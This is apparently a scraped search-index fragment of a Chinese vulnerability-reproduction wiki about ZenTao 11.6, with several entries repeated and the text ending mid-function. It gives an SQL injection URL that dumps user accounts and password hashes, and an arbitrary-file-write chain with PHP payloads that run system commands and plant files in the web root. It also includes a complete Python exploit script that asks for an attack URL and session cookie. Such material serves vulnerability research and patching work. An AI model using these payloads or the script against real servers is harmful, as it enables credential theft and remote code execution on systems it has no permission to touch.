if(!empty($this->app->user->modifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this->isOpenMethod($module, $method)) return true; if(!$this->loadModel('user')->isLogon() and $this->server->php_auth_user) $this->user->identifyByPhpAuth(); if(!$this->loadModel('user')->isLogon() and $this->cookie->za) $this->user->identifyByCookie(); if(isset($this->app->user)) { if(!commonModel::hasPriv($module, $method)) $this->deny($module, $method); } else { $referer = helper::safe64Encode($this->app->getURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); } } \u8fd9\u91cc\u68c0\u6d4b\u4e86\u8c03\u7528\u6a21\u5757\u548c\u65b9\u6cd5\u7684\u6743\u9650\uff0c\u53ef\u4ee5\u77e5\u9053\u9664\u4e86**isOpenMethod**\u4e2d\u5b9a\u4e49\u7684\u516c\u5f00\u6a21\u5757\u548c\u65b9\u6cd5\u4e4b\u5916\uff0c\u5176\u4ed6\u7684\u65b9\u6cd5\u90fd\u662f\u9700\u8981\u767b\u5f55\u7684 \u6700\u540e\u662f**$app->loadModule();**\u8fd9\u6bb5\u4ee3\u7801 public function loadModule() { $appName = $this->appName; $moduleName = $this->moduleName; $methodName = $this->methodName; /* * \u5f15\u5165\u8be5\u6a21\u5757\u7684control\u6587\u4ef6\u3002 * Include the control file of the module. **/ $file2Included = $this->setActionExtFile() ? $this->extActionFile : $this->controlFile; chdir(dirname($file2Included)); helper::import($file2Included); /* * \u8bbe\u7f6econtrol\u7684\u7c7b\u540d\u3002 * Set the class name of the control. **/ $className = class_exists(\"my$moduleName\") ? \"my$moduleName\" : $moduleName; if(!class_exists($className)) $this->triggerError(\"the control $className not found\", __FILE__, __LINE__, $exit = true); /* * \u521b\u5efacontrol\u7c7b\u7684\u5b9e\u4f8b\u3002 * Create a instance of the control. **/ $module = new $className(); if(!method_exists($module, $methodName)) $this->triggerError(\"the module $moduleName has no $methodName method\", __FILE__, __LINE__, $exit = true); $this->control = $module; /* include default value for module*/ $defaultValueFiles = glob($this->getTmpRoot() . \"defaultvalue/*.php\"); if($defaultValueFiles) foreach($defaultValueFiles as $file) include $file; /* * \u4f7f\u7528\u53cd\u5c04\u673a\u5236\u83b7\u53d6\u51fd\u6570\u53c2\u6570\u7684\u9ed8\u8ba4\u503c\u3002 * Get the default settings of the method to be called using the reflecting. * * */ $defaultParams = array(); $methodReflect = new reflectionMethod($className, $methodName); foreach($methodReflect->getParameters() as $param) { $name = $param->getName(); $default = '_NOT_SET'; if(isset($paramDefaultValue[$appName][$className][$methodName][$name])) { $default = $paramDefaultValue[$appName][$className][$methodName][$name]; } elseif(isset($paramDefaultValue[$className][$methodName][$name])) { $default = $paramDefaultValue[$className][$methodName][$name]; } elseif($param->isDefaultValueAvailable()) { $default = $param->getDefaultValue(); } $defaultParams[$name] = $default; } /** * \u6839\u636ePATH_INFO\u6216\u8005GET\u65b9\u5f0f\u8bbe\u7f6e\u8bf7\u6c42\u7684\u53c2\u6570\u3002 * Set params according PATH_INFO or GET. */ if($this->config->requestType != 'GET') { $this->setParamsByPathInfo($defaultParams); } else { $this->setParamsByGET($defaultParams); } if($this->config->framework->filterParam == 2) { $_GET = validater::filterParam($_GET, 'get'); $_COOKIE = validater::filterParam($_COOKIE, 'cookie'); } /* \u8c03\u7528\u8be5\u65b9\u6cd5 Call the method. */ call_user_func_array(array($module, $methodName), $this->params); return $module; } \u901a\u8fc7\u4e4b\u524d\u83b7\u53d6\u7684**moduleName**\u5305\u542b\u5bf9\u5e94\u7684**control\u7c7b**\u6587\u4ef6\u5e76\u5b9e\u4f8b\u5316\uff0c\u968f\u540e\u8c03\u7528**setParamsByPathInfo**\u65b9\u6cd5\u4ece\u8def\u5f84\u4e2d\u83b7\u53d6\u65b9\u6cd5\u5bf9\u5e94\u7684\u53c2\u6570\u503c\uff0c\u6700\u540e\u901a\u8fc7**call_user_func_array**\u65b9\u6cd5\u8c03\u7528\u5bf9\u5e94**control\u7c7b**\u4e2d\u7684\u5bf9\u5e94\u65b9\u6cd5\u5e76\u8d4b\u503c\u3002 \u6211\u4eec\u67e5\u770b**module/api/control.php**\u6587\u4ef6\u4e2d\u7684**getModel**\u65b9\u6cd5 \u8fd9\u91cc\u901a\u8fc7**call_user_func_array**\u51fd\u6570\u8c03\u7528\u6240\u6709\u7684**model\u6587\u4ef6**\u7684\u6240\u6709\u65b9\u6cd5\u3002 $result = call_user_func_array(array(&$module, $methodName), $params); \u53ef\u4ee5\u770b\u5230**module/api/moudel.php**\u4e2d\u7684**sql\u51fd\u6570** public function sql($sql, $keyField = '') { $sql = trim($sql); if(strpos($sql, ';') !== false) $sql = substr($sql, 0, strpos($sql, ';')); a($sql); if(empty($sql)) return ''; if(stripos($sql, 'select ') !== 0) { return $this->lang->api->error->onlySelect; } else { try { $stmt = $this->dao->query($sql); if(empty($keyField)) return $stmt->fetchAll(); $rows = array(); while($row = $stmt->fetch()) $rows[$row->$keyField] = $row; return $rows; } catch(PDOException $e) { return $e->getMessage(); } } } \u8fd9\u91cc\u5e76\u6ca1\u6709\u8fdb\u884c\u8fc7\u6ee4\uff0c\u53ea\u4f7f\u7528\u4e86\u4ee3\u7801** sql=trim( sql=trim( sql)**\u8fc7\u6ee4\u4e86\u7a7a\u683c \u6211\u4eec\u770b\u4e00\u4e0b\u8fd9\u91cc\u7684\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\u9700\u8981\u7684\u6743\u9650 \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u4efb\u4f55\u7528\u6237\u90fd\u53ef\u4ee5\u8c03\u7528\u8fd9\u4e2a\u6a21\u5757\u7684\u65b9\u6cd5\uff0c\u6240\u4ee5\u6211\u4eec\u7528\u5b83\u8c03\u7528**sql**\u65b9\u6cd5\u8fdb\u884c\u67e5\u8be2(\u7a7a\u683c\u8f6c\u6362\u4e3a+,\u7ed5\u8fc7\u8fc7\u6ee4) http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user \u6210\u529f\u6267\u884csql\u8bed\u53e5","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"\u767b\u9646\u540e\u8bbf\u95ee http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u7985\u9053 11.6\u7248\u672c \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u7985\u9053 11.6 \u7248\u672c\u4e2d\u5bf9\u7528\u6237\u63a5\u53e3\u8c03\u7528\u6743\u9650\u8fc7\u6ee4\u4e0d\u5b8c\u5584\uff0c\u5bfc\u81f4\u8c03\u7528\u63a5\u53e3\u6267\u884cSQL\u8bed\u53e5\u5bfc\u81f4SQL\u6ce8\u5165 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] \u7985\u9053 11.6 \u73af\u5883\u642d\u5efa \u00b6 \u8fd9\u91cc\u4f7f\u7528docker\u73af\u5883\u642d\u5efa docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8084 \u6309\u6b65\u9aa4\u5b89\u88c5\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8fd9\u91cc\u9020\u6210\u6f0f\u6d1e\u7684\u539f\u56e0\u540c\u6837\u662f\u8c03\u7528\u63a5\u53e3\u6743\u9650\u65e0\u9650\u5236\u7684\u539f\u56e0 \u63a5\u53e3\u51fa\u73b0\u6f0f\u6d1e\u7684\u539f\u56e0\u5177\u4f53\u53c2\u8003\u53ef\u4ee5\u67e5\u770b\u4e0a\u4e00\u7bc7 \u7985\u9053 11.6\u7248\u672c SQL\u6ce8\u5165\u6f0f\u6d1e \u5173\u4e8e\u6b64\u6f0f\u6d1e\u7684\u5b8c\u6574\u5206\u6790 \u67e5\u770b**module/api/ediyor/moudel.php**\u4e0b\u7684**save\u65b9\u6cd5** public function save($filePath) { $fileContent = $this->post->fileContent; $evils = array('eval', 'exec', 'passthru', 'proc_open', 'shell_exec', 'system', '$$', 'include', 'require', 'assert'); $gibbedEvils = array('e v a l', 'e x e c', ' p a s s t h r u', ' p r o c _ o p e n', 's h e l l _ e x e c', 's y s t e m', '$ $', 'i n c l u d e', 'r e q u i r e', 'a s s e r t'); $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent); if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent); $dirPath = dirname($filePath); $extFilePath = substr($filePath, 0, strpos($filePath, DS . 'ext' . DS) + 4); if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true); if(is_writable($dirPath)) { file_put_contents($filePath, $fileContent); } else { die(js::alert($this->lang->editor->notWritable . $extFilePath)); } } filePath\u53c2\u6570\u548c filePath\u53c2\u6570\u548c fileContent\u53c2\u6570 \u6211\u4eec\u662f\u53ef\u63a7\u7684 \u8c03\u7528\u65b9\u6cd5\u5f80 /tmp**\u5199\u5165\u4e00\u4e2a**phpinfo() http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell.php POST:fileContent=<?php phpinfo();?> \u5728\u5229\u7528 \u7985\u9053 11.6\u7248\u672c \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e \u7b2c\u4e8c\u79cd\u65b9\u6cd5\u6765\u6587\u4ef6\u5305\u542b http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 \u4e5f\u53ef\u4ee5\u5199\u5165\u7f51\u7ad9\u76ee\u5f55\u4e2d \u5148\u83b7\u53d6\u5730\u5740 http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell POST\uff1afileContent=<?php system('find / -name ioncube.php')?>');?> \u8bbf\u95ee** http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 ** \u5f97\u5230\u76ee\u5f55\u4e3a /app/zentaopma/www \u8bf7\u6c42\u6539\u4e3a http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell fileContent=<?php file_put_contents('/app/zentaopms/www/xxx.php', '<?php phpinfo();?>');?> \u518d\u53bb\u8bbf\u95ee** http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 **\u5219\u4f1a\u518d\u7f51\u7ad9\u76ee\u5f55\u4e0b\u751f\u6210 xxx.php \u6587\u4ef6 \u6f0f\u6d1e\u5229\u7528POC \u00b6 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: zentao version = 11.6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mZentaosid >>> xxxxxxxxxxxxxx(cookie\u5b57\u6bb5) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : response = requests . get ( url = version_url , timeout = 20 , headers = headers ) version = json . loads ( response . text )[ 'version' ] print ( \" \\033 [32m[o] \u7985\u9053\u7248\u672c\u4e3a: {} \\033 [0m\" . format ( version )) except Exception as e : print ( \" \\033 [31m[x] \u83b7\u53d6\u7248\u672c\u5931\u8d25 \\033 [0m\" , e ) sys . exit ( 0 ) def POC_2 ( target_url , zentaosid ): headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : \"zentaosid= {} \" . format ( zentaosid ) } data = { \"fileContent\" : \"<?php phpinfo();?>\" } write_url = target_url + \"/api-getModel-editor-save-filePath=/tmp/test\" try : response = requests . post ( url = write_url , data = data , headers = headers , timeout = 10 ) print ( \" \\033 [32m[o] \u5c1d\u8bd5\u5199\u5165php\u6587\u4ef6... \\033 [0m\" ) except : print ( \" \\033 [31m[x] \u5199\u5165php\u6587\u4ef6\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_3 ( target_url , zentaosid ): headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : \"zentaosid= {} \" . format ( zentaosid ) } vuln_url = target_url + \"/api-getModel-api-getMethod-filePath=/tmp/test/1\" try : response = requests . get ( url = vuln_url , headers = headers , timeout = 10 ) if \"System\" in response . text : print ( \" \\033 [32m[o] \u6210\u529f\u5199\u5165\u6587\u4ef6\uff0c\u5b58\u5728\u6f0f\u6d1e, \u8bbf\u95ee {} /api-getModel-api-getMethod-filePath=/tmp/test/1/ \u67e5\u770b \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u8bfb\u53d6php\u6587\u4ef6\u5931\u8d25 \\033 [0m\" ) except : print ( \" \\033 [31m[x] \u8bfb\u53d6php\u6587\u4ef6\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) zentaosid = str ( input ( \" \\033 [35mZentaosid >>> \\033 [0m\" )) POC_1 ( target_url ) POC_2 ( target_url , zentaosid ) POC_3 ( target_url , zentaosid )","title":"\u7985\u9053 11.6\u7248\u672c \u4efb\u610f\u6587\u4ef6\u5199\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u7985\u9053-116\u7248\u672c-\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e","text":"","title":"\u7985\u9053 11.6\u7248\u672c \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u7985\u9053 11.6 \u7248\u672c\u4e2d\u5bf9\u7528\u6237\u63a5\u53e3\u8c03\u7528\u6743\u9650\u8fc7\u6ee4\u4e0d\u5b8c\u5584\uff0c\u5bfc\u81f4\u8c03\u7528\u63a5\u53e3\u6267\u884cSQL\u8bed\u53e5\u5bfc\u81f4SQL\u6ce8\u5165","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] \u7985\u9053 11.6","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u73af\u5883\u642d\u5efa","text":"\u8fd9\u91cc\u4f7f\u7528docker\u73af\u5883\u642d\u5efa docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8084 \u6309\u6b65\u9aa4\u5b89\u88c5\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8fd9\u91cc\u9020\u6210\u6f0f\u6d1e\u7684\u539f\u56e0\u540c\u6837\u662f\u8c03\u7528\u63a5\u53e3\u6743\u9650\u65e0\u9650\u5236\u7684\u539f\u56e0 \u63a5\u53e3\u51fa\u73b0\u6f0f\u6d1e\u7684\u539f\u56e0\u5177\u4f53\u53c2\u8003\u53ef\u4ee5\u67e5\u770b\u4e0a\u4e00\u7bc7 \u7985\u9053 11.6\u7248\u672c SQL\u6ce8\u5165\u6f0f\u6d1e \u5173\u4e8e\u6b64\u6f0f\u6d1e\u7684\u5b8c\u6574\u5206\u6790 \u67e5\u770b**module/api/ediyor/moudel.php**\u4e0b\u7684**save\u65b9\u6cd5** public function save($filePath) { $fileContent = $this->post->fileContent; $evils = array('eval', 'exec', 'passthru', 'proc_open', 'shell_exec', 'system', '$$', 'include', 'require', 'assert'); $gibbedEvils = array('e v a l', 'e x e c', ' p a s s t h r u', ' p r o c _ o p e n', 's h e l l _ e x e c', 's y s t e m', '$ $', 'i n c l u d e', 'r e q u i r e', 'a s s e r t'); $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent); if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent); $dirPath = dirname($filePath); $extFilePath = substr($filePath, 0, strpos($filePath, DS . 'ext' . DS) + 4); if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true); if(is_writable($dirPath)) { file_put_contents($filePath, $fileContent); } else { die(js::alert($this->lang->editor->notWritable . $extFilePath)); } } filePath\u53c2\u6570\u548c filePath\u53c2\u6570\u548c fileContent\u53c2\u6570 \u6211\u4eec\u662f\u53ef\u63a7\u7684 \u8c03\u7528\u65b9\u6cd5\u5f80 /tmp**\u5199\u5165\u4e00\u4e2a**phpinfo() http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell.php POST:fileContent=<?php phpinfo();?> \u5728\u5229\u7528 \u7985\u9053 11.6\u7248\u672c \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e \u7b2c\u4e8c\u79cd\u65b9\u6cd5\u6765\u6587\u4ef6\u5305\u542b http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 \u4e5f\u53ef\u4ee5\u5199\u5165\u7f51\u7ad9\u76ee\u5f55\u4e2d \u5148\u83b7\u53d6\u5730\u5740 http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell POST\uff1afileContent=<?php system('find / -name ioncube.php')?>');?> \u8bbf\u95ee** http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 ** \u5f97\u5230\u76ee\u5f55\u4e3a /app/zentaopma/www \u8bf7\u6c42\u6539\u4e3a http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell fileContent=<?php file_put_contents('/app/zentaopms/www/xxx.php', '<?php phpinfo();?>');?> \u518d\u53bb\u8bbf\u95ee** http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 **\u5219\u4f1a\u518d\u7f51\u7ad9\u76ee\u5f55\u4e0b\u751f\u6210 xxx.php \u6587\u4ef6","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"#!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: zentao version = 11.6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mZentaosid >>> xxxxxxxxxxxxxx(cookie\u5b57\u6bb5) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : response = requests . get ( url = version_url , timeout = 20 , headers = headers ) version = json . loads ( response . text )[ 'version' ] print ( \" \\033 [32m[o] \u7985\u9053\u7248\u672c\u4e3a: {} \\033 [0m\" . format ( version )) except Exception as e : print ( \" \\033 [31m[x] \u83b7\u53d6\u7248\u672c\u5931\u8d25 \\033 [0m\" , e ) sys . exit ( 0 ) def POC_2 ( target_url , zentaosid ): headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : \"zentaosid= {} \" . format ( zentaosid ) } data = { \"fileContent\" : \"<?php phpinfo();?>\" } write_url = target_url + \"/api-getModel-editor-save-filePath=/tmp/test\" try : response = requests . post ( url = write_url , data = data , headers = headers , timeout = 10 ) print ( \" \\033 [32m[o] \u5c1d\u8bd5\u5199\u5165php\u6587\u4ef6... \\033 [0m\" ) except : print ( \" \\033 [31m[x] \u5199\u5165php\u6587\u4ef6\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_3 ( target_url , zentaosid ): headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : \"zentaosid= {} \" . format ( zentaosid ) } vuln_url = target_url + \"/api-getModel-api-getMethod-filePath=/tmp/test/1\" try : response = requests . get ( url = vuln_url , headers = headers , timeout = 10 ) if \"System\" in response . text : print ( \" \\033 [32m[o] \u6210\u529f\u5199\u5165\u6587\u4ef6\uff0c\u5b58\u5728\u6f0f\u6d1e, \u8bbf\u95ee {} /api-getModel-api-getMethod-filePath=/tmp/test/1/ \u67e5\u770b \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u8bfb\u53d6php\u6587\u4ef6\u5931\u8d25 \\033 [0m\" ) except : print ( \" \\033 [31m[x] \u8bfb\u53d6php\u6587\u4ef6\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) zentaosid = str ( input ( \" \\033 [35mZentaosid >>> \\033 [0m\" )) POC_1 ( target_url ) POC_2 ( target_url , zentaosid ) POC_3 ( target_url , zentaosid )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CMS%E6%BC%8F%E6%B4%9E/%E7%A6%85%E9%81%93CMS/%E7%A6%85%E9%81%93%2011.6%E7%89%88%E6%9C%AC%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","text":"\u7985\u9053 11.6\u7248\u672c \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u7985\u9053 11.6 \u7248\u672c\u4e2d\u5bf9\u7528\u6237\u63a5\u53e3\u8c03\u7528\u6743\u9650\u8fc7\u6ee4\u4e0d\u5b8c\u5584\uff0c\u5bfc\u81f4\u8c03\u7528\u63a5\u53e3\u6267\u884cSQL\u8bed\u53e5\u5bfc\u81f4SQL\u6ce8\u5165 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] \u7985\u9053 11.6 \u73af\u5883\u642d\u5efa \u00b6 \u8fd9\u91cc\u4f7f\u7528docker\u73af\u5883\u642d\u5efa docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8084 \u6309\u6b65\u9aa4\u5b89\u88c5\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8fd9\u91cc\u9020\u6210\u6f0f\u6d1e\u7684\u539f\u56e0\u540c\u6837\u662f\u8c03\u7528\u63a5\u53e3\u6743\u9650\u65e0\u9650\u5236\u7684\u539f\u56e0 \u63a5\u53e3\u51fa\u73b0\u6f0f\u6d1e\u7684\u539f\u56e0\u5177\u4f53\u53c2\u8003\u53ef\u4ee5\u67e5\u770b\u4e0a\u4e00\u7bc7 \u7985\u9053 11.6\u7248\u672c SQL\u6ce8\u5165\u6f0f\u6d1e \u5173\u4e8e\u6b64\u6f0f\u6d1e\u7684\u5b8c\u6574\u5206\u6790 \u7b2c\u4e00\u79cd\u65b9\u6cd5 \u00b6 \u67e5\u770b**module/file/moudel.php**\u4e0b\u7684**parseCSV\u65b9\u6cd5** public function parseCSV($fileName) { $content = file_get_contents($fileName); /* Fix bug #890. */ $content = str_replace(\"\\x82\\x32\", \"\\x10\", $content); $lines = explode(\"\\n\", $content); $col = -1; $row = 0; $data = array(); foreach($lines as $line) { $line = trim($line); $markNum = substr_count($line, '\"') - substr_count($line, '\\\"'); if(substr($line, -1) != ',' and (($markNum % 2 == 1 and $col != -1) or ($markNum % 2 == 0 and substr($line, -2) != ',\"' and $col == -1))) $line .= ','; $line = str_replace(',\"\",', ',,', $line); $line = str_replace(',\"\",', ',,', $line); $line = preg_replace_callback('/(\\\"{2,})(\\,+)/U', array($this, 'removeInterference'), $line); $line = str_replace('\"\"', '\"', $line); /* if only one column then line is the data. */ if(strpos($line, ',') === false and $col == -1) { $data[$row][0] = trim($line, '\"'); } else { /* if col is not -1, then the data of column is not end. */ if($col != -1) { $pos = strpos($line, '\",'); if($pos === false) { $data[$row][$col] .= \"\\n\" . $line; $data[$row][$col] = str_replace('&comma;', ',', $data[$row][$col]); continue; } else { $data[$row][$col] .= \"\\n\" . substr($line, 0, $pos); $data[$row][$col] = trim(str_replace('&comma;', ',', $data[$row][$col])); $line = substr($line, $pos + 2); $col++; } } if($col == -1) $col = 0; /* explode cols with delimiter. */ while($line) { /* the cell has '\"', the delimiter is '\",'. */ if($line{0} == '\"') { $pos = strpos($line, '\",'); if($pos === false) { $data[$row][$col] = substr($line, 1); /* if line is not empty, then the data of cell is not end. */ if(strlen($line) >= 1) continue 2; $line = ''; } else { $data[$row][$col] = substr($line, 1, $pos - 1); $line = substr($line, $pos + 2); } $data[$row][$col] = str_replace('&comma;', ',', $data[$row][$col]); } else { /* the delimiter default is ','. */ $pos = strpos($line, ','); /* if line is not delimiter, then line is the data of cell. */ if($pos === false) { $data[$row][$col] = $line; $line = ''; } else { $data[$row][$col] = substr($line, 0, 